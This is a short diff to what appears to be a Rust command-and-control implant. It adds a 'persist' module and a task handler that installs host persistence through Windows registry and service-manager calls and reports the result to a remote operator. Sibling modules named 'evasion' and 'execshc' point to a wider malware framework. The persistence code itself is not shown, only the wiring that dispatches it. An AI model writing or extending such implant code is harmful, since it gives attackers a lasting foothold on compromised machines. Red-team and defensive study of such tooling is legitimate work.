@@ -29,6 +29,7 @@ mod evasion;
 mod execshc;
 mod mapper;
 mod modules;
+mod persist;
 mod selfinfo;
 mod vdm;
 
@@ -893,6 +894,31 @@ async fn execute_task<S: AsyncRead + AsyncWrite + Unpin>(
                     id: task.id,
                     status,
                     data: out,
+                },
+            )
+            .await
+        }
+        TaskBody::Persist {
+            action,
+            mechanism,
+            name,
+            exe,
+            args,
+        } => {
+            // Host persistence on the session thread (ABR-T030): the
+            // registry/SCM calls are blocking, same as the driver arm.
+            let (status, data) = match persist::stage(action, &mechanism, &name, &exe, &args) {
+                Ok(data) => (message::STATUS_OK, data),
+                Err(e) => (message::STATUS_ERROR, e.into_bytes()),
+            };
+            send_result(
+                conn,
+                session,
+                profile,
+                TaskResult {
+                    id: task.id,
+                    status,
+                    data,
                 },
             )
             .await
